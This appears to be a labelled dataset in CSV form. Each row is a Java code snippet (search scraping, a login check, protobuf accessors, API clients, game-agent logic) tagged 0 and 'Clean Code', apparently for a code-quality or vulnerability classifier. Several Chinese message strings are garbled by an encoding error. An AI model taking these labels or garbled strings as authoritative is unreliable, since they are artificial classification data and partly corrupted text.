text,label,text_label
"@Override public String searchContent(String key,boolean quick){
  try {
    fetchRule();
    if (rule.getSearchUrl().isEmpty()) {
      return """";
    }
    String webUrl=rule.getSearchUrl().replace(""{wd}"",URLEncoder.encode(key));
    String webContent=fetch(webUrl);
    JSONObject result=new JSONObject();
    JSONArray videos=new JSONArray();
    if (rule.getSearchVodNode().startsWith(""json:"")) {
      String[] node=rule.getSearchVodNode().substring(5).split("">"");
      JSONObject data=new JSONObject(webContent);
      for (int i=0; i < node.length; i++) {
        if (i == node.length - 1) {
          JSONArray vodArray=data.getJSONArray(node[i]);
          for (int j=0; j < vodArray.length(); j++) {
            JSONObject vod=vodArray.getJSONObject(j);
            String name=vod.optString(rule.getSearchVodName()).trim();
            name=rule.getSearchVodNameR(name);
            String id=vod.optString(rule.getSearchVodId()).trim();
            id=rule.getSearchVodIdR(id);
            String pic=vod.optString(rule.getSearchVodImg()).trim();
            pic=rule.getSearchVodImgR(pic);
            pic=Misc.fixUrl(webUrl,pic);
            String mark=vod.optString(rule.getSearchVodMark()).trim();
            mark=rule.getSearchVodMarkR(mark);
            JSONObject v=new JSONObject();
            v.put(""vod_id"",id);
            v.put(""vod_name"",name);
            v.put(""vod_pic"",pic);
            v.put(""vod_remarks"",mark);
            videos.put(v);
          }
        }
 else {
          data=data.getJSONObject(node[i]);
        }
      }
    }
 else {
      JXDocument doc=JXDocument.create(webContent);
      List<JXNode> vodNodes=doc.selN(rule.getSearchVodNode());
      for (int i=0; i < vodNodes.size(); i++) {
        String name=vodNodes.get(i).selOne(rule.getSearchVodName()).asString().trim();
        name=rule.getSearchVodNameR(name);
        String id=vodNodes.get(i).selOne(rule.getSearchVodId()).asString().trim();
        id=rule.getSearchVodIdR(id);
        String pic=vodNodes.get(i).selOne(rule.getSearchVodImg()).asString().trim();
        pic=rule.getSearchVodImgR(pic);
        pic=Misc.fixUrl(webUrl,pic);
        String mark="""";
        if (!rule.getCateVodMark().isEmpty()) {
          try {
            mark=vodNodes.get(i).selOne(rule.getSearchVodMark()).asString().trim();
            mark=rule.getSearchVodMarkR(mark);
          }
 catch (          Exception e) {
            SpiderDebug.log(e);
          }
        }
        JSONObject v=new JSONObject();
        v.put(""vod_id"",id);
        v.put(""vod_name"",name);
        v.put(""vod_pic"",pic);
        v.put(""vod_remarks"",mark);
        videos.put(v);
      }
    }
    result.put(""list"",videos);
    return result.toString();
  }
 catch (  Exception e) {
    SpiderDebug.log(e);
  }
  return """";
}",0,Clean Code
"@Override public ServerResponseEntity<UserInfoInTokenBO> getUserInfoInTokenByInputUserNameAndPassword(String inputUserName,String password,Integer sysType){
  if (StrUtil.isBlank(inputUserName)) {
    return ServerResponseEntity.showFailMsg(""鐢ㄦ埛鍚嶄笉鑳戒负绌�"");
  }
  if (StrUtil.isBlank(password)) {
    return ServerResponseEntity.showFailMsg(""瀵嗙爜涓嶈兘涓虹┖"");
  }
  InputUserNameEnum inputUserNameEnum=null;
  if (PrincipalUtil.isUserName(inputUserName)) {
    inputUserNameEnum=InputUserNameEnum.USERNAME;
  }
  if (inputUserNameEnum == null) {
    return ServerResponseEntity.showFailMsg(""璇疯緭鍏ユ纭殑鐢ㄦ埛鍚�"");
  }
  AuthAccountInVerifyBO authAccountInVerifyBO=authAccountMapper.getAuthAccountInVerifyByInputUserName(inputUserNameEnum.value(),inputUserName,sysType);
  if (authAccountInVerifyBO == null) {
    prepareTimingAttackProtection();
    mitigateAgainstTimingAttack(password);
    return ServerResponseEntity.showFailMsg(""鐢ㄦ埛鍚嶆垨瀵嗙爜涓嶆纭�"");
  }
  if (Objects.equals(authAccountInVerifyBO.getStatus(),AuthAccountStatusEnum.DISABLE.value())) {
    return ServerResponseEntity.showFailMsg(""鐢ㄦ埛宸茬鐢紝璇疯仈绯诲鏈�"");
  }
  if (!passwordEncoder.matches(password,authAccountInVerifyBO.getPassword())) {
    return ServerResponseEntity.showFailMsg(""鐢ㄦ埛鍚嶆垨瀵嗙爜涓嶆纭�"");
  }
  return ServerResponseEntity.success(BeanUtil.map(authAccountInVerifyBO,UserInfoInTokenBO.class));
}
",0,Clean Code
"public IntegerWrapper(int initialValue){
  value=initialValue;
}
public IntegerWrapper(){
}
",0,Clean Code
"boolean closing(TabButtonComponent btc);
",0,Clean Code
"public String getOldVersionStr(){
  return this.oldVersionStr;
}
",0,Clean Code
"/** 
 * Pagination query
 * @param param
 * @param selector
 * @return
 */
PageResult<Team> pageQuery(TeamPageQueryParam param,TeamSelector selector);
",0,Clean Code
"@Override public final BattleEndReason forName(final CharSequence value){
  if (value.length() == 22) {
    if (ProtoUtil.isEqual(""BATTLE_END_REASON_NONE"",value)) {
      return BATTLE_END_REASON_NONE;
    }
  }
  if (value.length() == 25) {
    if (ProtoUtil.isEqual(""BATTLE_END_REASON_ALL_DIE"",value)) {
      return BATTLE_END_REASON_ALL_DIE;
    }
  }
  if (value.length() == 28) {
    if (ProtoUtil.isEqual(""BATTLE_END_REASON_TURN_LIMIT"",value)) {
      return BATTLE_END_REASON_TURN_LIMIT;
    }
  }
  return null;
}",0,Clean Code
"/** 
 * <code>optional uint32 index = 4;</code>
 * @return the index
 */
public int getIndex(){
  return index;
}",0,Clean Code
"/** 
 * Create a new chat completion api with default base URL.
 * @param zhiPuAiToken ZhiPuAI apiKey.
 */
public ZhiPuAiApi(String zhiPuAiToken){
  this(ApiUtils.DEFAULT_BASE_URL,zhiPuAiToken);
}
/** 
 * Create a new chat completion api.
 * @param baseUrl api base URL.
 * @param zhiPuAiToken ZhiPuAI apiKey.
 */
public ZhiPuAiApi(String baseUrl,String zhiPuAiToken){
  this(baseUrl,zhiPuAiToken,RestClient.builder());
}
/** 
 * Create a new chat completion api.
 * @param baseUrl api base URL.
 * @param zhiPuAiToken ZhiPuAI apiKey.
 * @param restClientBuilder RestClient builder.
 */
public ZhiPuAiApi(String baseUrl,String zhiPuAiToken,RestClient.Builder restClientBuilder){
  this(baseUrl,zhiPuAiToken,restClientBuilder,RetryUtils.DEFAULT_RESPONSE_ERROR_HANDLER);
}
/** 
 * Create a new chat completion api.
 * @param baseUrl api base URL.
 * @param zhiPuAiToken ZhiPuAI apiKey.
 * @param restClientBuilder RestClient builder.
 * @param responseErrorHandler Response error handler.
 */
public ZhiPuAiApi(String baseUrl,String zhiPuAiToken,RestClient.Builder restClientBuilder,ResponseErrorHandler responseErrorHandler){
  this.restClient=restClientBuilder.baseUrl(baseUrl).defaultHeaders(ApiUtils.getJsonContentHeaders(zhiPuAiToken)).defaultStatusHandler(responseErrorHandler).build();
  this.webClient=WebClient.builder().baseUrl(baseUrl).defaultHeaders(ApiUtils.getJsonContentHeaders(zhiPuAiToken)).build();
}
",0,Clean Code
"/** 
 * <code>optional bool paused = 11;</code>
 * @return whether the paused field is set
 */
public boolean hasPaused(){
  return (bitField0_ & 0x00000002) != 0;
}",0,Clean Code
"/** 
 * Relies upon allLeftIndices being sorted in ascending order. Undefined when it's not.
 * @param allLeftIndices The indices of the left branch.
 * @param buffer The buffer to write out the unused indices to.
 * @return A pair, with the first element the left branch and the second element the right branch.
 */
public Pair<InvertedFeature,InvertedFeature> split(IntArrayContainer allLeftIndices,IntArrayContainer buffer){
  int[] allLeftArray=allLeftIndices.array;
  int allLeftSize=allLeftIndices.size;
  int[] bufferArray=buffer.array;
  if (indices != null) {
    int[] leftIndices=new int[indices.length];
    int leftSize=0;
    int[] rightIndices=new int[indices.length];
    int rightSize=0;
    int bufferIdx=0;
    int curIndex=0;
    int j=0;
    for (int i=0; i < curSize; i++) {
      while ((j < allLeftSize) && ((curIndex=allLeftArray[j]) < indices[i])) {
        bufferArray[bufferIdx]=curIndex;
        bufferIdx++;
        j++;
      }
      if ((j < allLeftSize) && (allLeftArray[j] == indices[i])) {
        leftIndices[leftSize]=indices[i];
        leftSize++;
        j++;
      }
 else {
        rightIndices[rightSize]=indices[i];
        rightSize++;
      }
    }
    if (j < allLeftSize) {
      System.arraycopy(allLeftArray,j,bufferArray,bufferIdx,allLeftSize - j);
    }
    buffer.size=bufferIdx + (allLeftSize - j);
    allLeftIndices.size=0;
    InvertedFeature left, right;
    if (leftSize == 0) {
      left=null;
    }
 else     if (leftSize == 1) {
      left=new InvertedFeature(value,leftIndices[0]);
    }
 else {
      left=new InvertedFeature(value,Arrays.copyOf(leftIndices,leftSize));
    }
    if (rightSize == 0) {
      right=null;
    }
 else     if (rightSize == 1) {
      right=new InvertedFeature(value,rightIndices[0]);
    }
 else {
      right=new InvertedFeature(value,Arrays.copyOf(rightIndices,rightSize));
    }
    return new Pair<>(left,right);
  }
 else {
    boolean found=false;
    int i=0;
    while (!found && i < allLeftSize) {
      if (allLeftArray[i] == index) {
        found=true;
      }
 else {
        i++;
      }
    }
    if (found) {
      System.arraycopy(allLeftArray,0,bufferArray,0,i);
      i++;
      while (i < allLeftSize) {
        bufferArray[i - 1]=allLeftArray[i];
        i++;
      }
      if (i < allLeftSize - 1) {
        System.arraycopy(allLeftArray,i + 1,bufferArray,i,allLeftSize - i);
      }
      buffer.size=allLeftSize - 1;
      allLeftIndices.size=0;
      return new Pair<>(new InvertedFeature(value,index),null);
    }
 else {
      allLeftIndices.array=bufferArray;
      allLeftIndices.size=0;
      buffer.array=allLeftArray;
      buffer.size=allLeftSize;
      return new Pair<>(null,new InvertedFeature(value,index));
    }
  }
}",0,Clean Code
"public String getBlockName(){
  return this.blockName;
}
",0,Clean Code
"/** 
 * @param apiHostValue
 * @return
 */
public BaichuanAIStreamClient.Builder apiHost(String apiHostValue){
  this.apiHost=apiHostValue;
  return this;
}
",0,Clean Code
"/** 
 * 淇濆瓨adminMessage
 * @param adminMessage:绯荤粺娑堟伅琛�
 * @return 淇濆瓨adminMessage
 */
@PostMapping(""/adminMessage/save"") public Result<AdminMessage> save(@RequestBody AdminMessage adminMessage);
",0,Clean Code
"@Override public boolean matches(final ZyGraphNode<? extends CViewNode<?>> node){
  return node.getRawNode().getColor().equals(getColor());
}
",0,Clean Code
"/** 
 * Get the model property: The model name to provide as part of this completions request. Not applicable to Fast Chat AI, where deployment information should be included in the Fast Chat AI resource URI that's connected to.
 * @return the model value.
 */
public String getModel(){
  return this.model;
}
",0,Clean Code
"@Override public void deleteProximityBrowsingNodes(){
  super.deleteProximityBrowsingNodes();
}
",0,Clean Code
"/** 
 * Apply a processed input event. <p> All input events should be supported, including software/hardware events, characters as well as deletions, multiple inputs and gestures.
 * @param event the event to apply. Must not be null.
 */
public void applyProcessedEvent(final Event event){
  applyProcessedEvent(event,false);
}
public void applyProcessedEvent(final Event event,final boolean keepCursorPosition){
  mCombinerChain.applyProcessedEvent(event);
  final int primaryCode=event.getMCodePoint();
  final int keyX=event.getMX();
  final int keyY=event.getMY();
  final int newIndex=size();
  refreshTypedWordCache();
  if (!keepCursorPosition || newIndex == mCodePointSize)   mCursorPositionWithinWord=mCodePointSize;
  if (0 == mCodePointSize) {
    mIsOnlyFirstCharCapitalized=false;
  }
  if (KeyCode.DELETE != event.getMKeyCode()) {
    if (newIndex < MAX_WORD_LENGTH) {
      if (!mIsBatchMode) {
        mInputPointers.addPointerAt(newIndex,keyX,keyY,0,0);
      }
    }
    if (0 == newIndex) {
      mIsOnlyFirstCharCapitalized=Character.isUpperCase(primaryCode);
    }
 else {
      mIsOnlyFirstCharCapitalized=mIsOnlyFirstCharCapitalized && !Character.isUpperCase(primaryCode);
    }
    if (Character.isUpperCase(primaryCode))     mCapsCount++;
    if (Character.isDigit(primaryCode))     mDigitsCount++;
  }
  mAutoCorrection=null;
}",0,Clean Code
"@Override protected void endTyped(VmTyped value,boolean isEmpty){
}
",0,Clean Code
"@Override public void update(World world){
  if (this.mustWaitTurn && !this.isOurTurn)   return;
  if (!this.mustWaitTurn) {
    this.timeSinceLastUpdate++;
    if (this.timeSinceLastUpdate < this.speedInTicks)     return;
  }
  this.timeSinceLastUpdate=0;
  this.isOurTurn=false;
  if (!pinchedByPlayer(world)) {
    BlockPos posHead=this.path.peekFirst();
    BlockPos posTail=this.path.peekLast();
    ArrayList<BlockPos> possibleMovesForward=new ArrayList<BlockPos>();
    ArrayList<BlockPos> possibleMovesBackward=new ArrayList<BlockPos>();
    for (int x=-1; x <= 1; x++) {
      for (int z=-1; z <= 1; z++) {
        if (z != 0 && x != 0)         continue;
        if (z == 0 && x == 0)         continue;
        BlockPos candidateHeadPos=new BlockPos(posHead.getX() + x,posHead.getY(),posHead.getZ() + z);
        BlockPos candidateTailPos=new BlockPos(posTail.getX() + x,posTail.getY(),posTail.getZ() + z);
        if (isValid(world,candidateHeadPos))         possibleMovesForward.add(candidateHeadPos);
        if (isValid(world,candidateTailPos))         possibleMovesBackward.add(candidateTailPos);
      }
    }
    ArrayList<BlockPos> candidates=null;
    boolean forwards=true;
    if (possibleMovesBackward.isEmpty()) {
      candidates=possibleMovesForward;
      forwards=true;
    }
 else     if (possibleMovesForward.isEmpty()) {
      candidates=possibleMovesBackward;
      forwards=false;
    }
 else {
      forwards=this.rng.nextDouble() < 0.5;
      candidates=forwards ? possibleMovesForward : possibleMovesBackward;
    }
    if (!candidates.isEmpty()) {
      BlockDrawingHelper drawContext=new BlockDrawingHelper();
      drawContext.beginDrawing(world);
      BlockPos newPos=candidates.get(this.rng.nextInt(candidates.size()));
      if (forwards) {
        this.originalPath.addFirst(world.getBlockState(newPos));
        drawContext.setBlockState(world,newPos,this.blockType);
        this.path.addFirst(newPos);
        if (this.path.size() > this.pathSize) {
          drawContext.setBlockState(world,posTail,new XMLBlockState(this.originalPath.removeLast()));
          this.path.removeLast();
        }
      }
 else {
        this.originalPath.addLast(world.getBlockState(newPos));
        drawContext.setBlockState(world,newPos,this.blockType);
        this.path.addLast(newPos);
        if (this.path.size() > this.pathSize) {
          drawContext.setBlockState(world,posHead,new XMLBlockState(this.originalPath.removeFirst()));
          this.path.removeFirst();
        }
      }
      drawContext.endDrawing(world);
    }
  }
  if (this.mustWaitTurn) {
    Map<String,String> data=new HashMap<String,String>();
    data.put(""agentname"",this.guid);
    MalmoMod.network.sendToServer(new MalmoMod.MalmoMessage(MalmoMessageType.CLIENT_TURN_TAKEN,0,data));
  }
}",0,Clean Code
"@Override public UnlockBackGroundMusicCsReq clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  unlockIds.clear();
  return this;
}",0,Clean Code
"@Test public void chatCompletionStream(){
  MediaContent anthropicMessage=new MediaContent(""Name 3 famous pirates"");
  ChatCompletionMessage chatCompletionMessage=new ChatCompletionMessage(List.of(anthropicMessage),Role.USER);
  AnthropicChatRequest request=AnthropicChatRequest.builder(List.of(chatCompletionMessage)).withTemperature(0.8f).withMaxTokens(300).withTopK(10).withAnthropicVersion(DEFAULT_ANTHROPIC_VERSION).build();
  Flux<Anthropic3ChatBedrockApi.AnthropicChatStreamingResponse> responseStream=anthropicChatApi.chatCompletionStream(request);
  List<Anthropic3ChatBedrockApi.AnthropicChatStreamingResponse> responses=responseStream.collectList().block();
  assertThat(responses).isNotNull();
  assertThat(responses).hasSizeGreaterThan(10);
  assertThat(responses.stream().filter(message -> message.type() == StreamingType.CONTENT_BLOCK_DELTA).map(message -> message.delta().text()).collect(Collectors.joining())).contains(""Blackbeard"");
}",0,Clean Code
"@Override public String spop(final String key){
  try {
    return redis.spop(key);
  }
 catch (  Exception e) {
    throw new JedisException(e);
  }
}
",0,Clean Code
"public static int getIdentifier(Context ctx,String type,String name,boolean allowSearch){
  if (name == null) {
    return 0;
  }
  if (name.contains(""@"")) {
    String[] arr=name.split(""@"");
    name=arr[arr.length - 1];
  }
  if (type == null && name.contains(""/"")) {
    String[] arr=name.split(""/"");
    type=arr[0];
    name=arr[arr.length - 1];
  }
  try {
    return Integer.parseInt(name);
  }
 catch (  NumberFormatException ignored) {
  }
  if (ctx == null) {
    ctx=HostInfo.getApplication();
  }
  String pkg=ctx.getPackageName();
  int ret=ctx.getResources().getIdentifier(name,type,pkg);
  if (ret != 0) {
    return ret;
  }
  ConfigManager cache=ConfigManager.getCache();
  ret=cache.getIntOrDefault(CACHED_RES_ID_NAME_PREFIX + type + ""/""+ name,0);
  int oldcode=cache.getIntOrDefault(CACHED_RES_ID_CODE_PREFIX + type + ""/""+ name,-1);
  int currcode=HostInfo.getVersionCode32();
  if (ret != 0 && (oldcode == currcode)) {
    return ret;
  }
  if (!allowSearch) {
    return 0;
  }
  ret=enumArsc(pkg,type,name);
  if (ret != 0) {
    cache.putInt(CACHED_RES_ID_NAME_PREFIX + type + ""/""+ name,ret);
    cache.putInt(CACHED_RES_ID_CODE_PREFIX + type + ""/""+ name,currcode);
    cache.save();
  }
  return ret;
}",0,Clean Code
